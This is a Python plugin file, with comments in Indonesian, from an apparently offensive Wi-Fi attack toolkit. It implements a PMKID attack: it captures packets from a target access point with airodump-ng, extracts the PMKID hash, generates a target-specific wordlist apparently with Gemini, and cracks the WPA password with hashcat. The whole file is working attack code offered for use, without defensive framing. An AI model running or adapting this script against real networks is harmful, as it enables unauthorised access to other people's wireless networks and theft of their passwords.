# File: attacks/pmkid_attack.py
import os
import time
import subprocess
from common_utils import (
    run_command, 
    generate_report, 
    generate_gemini_wordlist, 
    convert_cap_to_hashcat, 
    crack_with_hashcat,
    clear_session
)

class AttackPlugin:
    name = "Serangan PMKID"
    description = "Modern, tanpa deauth, via Airodump"
    requires_aggressive_mode = True # Tetap butuh mode agresif untuk memastikan interface bersih

    def __init__(self, ui, config):
        self.ui = ui
        self.config = config
        self.pmkid_capture_prefix = config.get('Filenames', 'pmkid_capture')
        self.hashcat_hash_file = config.get('Filenames', 'hashcat_hash')

    def run(self, monitor_interface, target):
        self.ui.header(self.name)
        
        bssid = target[1]
        channel = target[2]
        
        # --- LANGKAH 1: TANGKAP PAKET DENGAN AIRODUMP-NG ---
        prefix = os.path.abspath(self.pmkid_capture_prefix)
        # Hapus file lama jika ada
        for f in os.listdir('.'):
            if f.startswith(self.pmkid_capture_prefix):
                os.remove(f)

        cmd = ['airodump-ng', '--bssid', bssid, '-c', channel, '-w', prefix, monitor_interface]
        
        self.ui.start_spinner(f"Menangkap paket dari {bssid} untuk mencari PMKID (30 detik)...")
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(30)
        p.terminate()
        p.wait()
        self.ui.stop_spinner(True, "Penangkapan paket selesai.")

        capture_file = f"{prefix}-01.cap"
        if not os.path.exists(capture_file):
            self.ui.error("Gagal menangkap paket. Tidak ada file .cap yang dibuat."); return

        # --- LANGKAH 2: EKSTRAK PMKID DARI HASIL TANGKAPAN ---
        hashcat_file = convert_cap_to_hashcat(self.ui, self.config, capture_file)
        
        if not hashcat_file:
            self.ui.error("Tidak ada PMKID yang berhasil diekstrak dari paket yang ditangkap.")
            self.ui.info("Ini bisa berarti router tidak rentan atau tidak ada aktivitas klien yang tepat saat penangkapan.")
            return
        
        self.ui.success("PMKID Hash berhasil diekstrak! Siap untuk dipecahkan dengan Hashcat.")
        all_results = []
        
        # --- LANGKAH 3: CRACKING DENGAN HASHCAT ---
        gemini_wordlist_path = generate_gemini_wordlist(self.ui, self.config, target)
        if gemini_wordlist_path:
            # PMKID hanya bisa di-crack dengan hashcat
            result_pmkid = crack_with_hashcat(self.ui, self.config, target, hashcat_file, gemini_wordlist_path)
            all_results.append(("Hashcat + Gemini Wordlist (PMKID)", result_pmkid))
            
            if "KEY FOUND!" in result_pmkid:
                self.ui.success("Password ditemukan dengan serangan PMKID!")
                clear_session(self.ui, self.config, target[1])
            else:
                 self.ui.error("Gagal menemukan password dengan wordlist Gemini.")
        else:
            all_results.append(("Hashcat + Gemini Wordlist (PMKID)", "Gagal membuat wordlist Gemini."))
        
        generate_report(self.ui, self.config, target, all_results)